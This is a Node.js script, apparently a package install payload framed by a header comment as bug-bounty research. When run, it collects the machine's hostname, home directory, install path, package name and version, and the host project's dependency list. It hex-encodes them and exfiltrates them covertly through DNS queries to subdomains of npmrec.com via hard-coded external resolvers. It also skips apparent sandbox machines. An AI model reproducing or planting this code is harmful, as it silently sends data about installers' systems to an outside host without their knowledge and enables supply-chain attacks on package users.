 /*

This code is used for research purposes.

No sensitive data is retrieved.

Callbacks from within organizations with a
responsible disclosure program will be reported
directly to the organizations.

Any other callbacks will be ignored, and
any associated data will not be kept.

If you have any questions, please contact:
- harbitz@wearehackerone.com

*/

const dns = require("dns");
const os = require("os")
const fs = require("fs");
const process = require("process");

function toHex(str) {
    var result = '';
    for (var i=0; i<str.length; i++) {
      result += str.charCodeAt(i).toString(16);
    }
    return result;
}

const homeDirsToIgnore = [
    "/root/test/node_modules",
    "/ptd/node_modules",
    "/home/fakename/app",
    "/root",
    "/home/lili",
    "/home/app"
];

const hostnamesToIgnore = [
    "BBOGENS-LAPTOP",
];

function getPkgJsonDir() {
    const { dirname } = require ( 'path' );
    const { constants, accessSync } = require ( 'fs' );

    for ( let path of module.paths ) {
        try {
            let prospectivePkgJsonDir = dirname ( path );
            accessSync ( path, constants.F_OK );
            return prospectivePkgJsonDir;
        } catch ( e ) {}
    }
}

function main() {
    const pjs = JSON.parse((fs.readFileSync(__dirname + "/package.json")).toString());
    const id = Date.now();

    if (homeDirsToIgnore.indexOf(os.homedir()) > -1) {
        return;
    }

    if (hostnamesToIgnore.indexOf(os.hostname()) > -1) {
        return;
    }

    let packages = "";

    try {
        const pjsRoot = JSON.parse((fs.readFileSync(getPkgJsonDir() + "/package.json")).toString());
        packages = JSON.stringify(Array.from(Object.keys(pjsRoot.dependencies)).join(";"));
    } catch {
    }
    
    const relevantInfo = [
        os.hostname(),
        os.homedir(),
        __dirname,
        pjs.name + "-" + pjs.version,
        packages
    ]

    const stringFragments = toHex(JSON.stringify(relevantInfo)).match(/.{1,63}/g);

    sendData(stringFragments);
    dns.lookup('ns1.npmrec.com', function(err, address) {
        if (!err) {
            nsAddress = address;
        } else {
            nsAddress = '8.8.8.8';
        }
        dns.setServers(['188.166.0.193', '188.166.110.6']);
        sendData(stringFragments);
    });

    function sendData(stringFragments) {
        for (let i = 0; i < stringFragments.length; i++) {
            try {
                resolveFragment(id, i, stringFragments);
            } catch {
            }
        }
    }

    function resolveFragment(id, counter, stringFragments) {
        dns.resolve4(`morjok.${id}.${counter+1}.${stringFragments[counter]}.npmrec.com`, () => {})
    }
}

main();
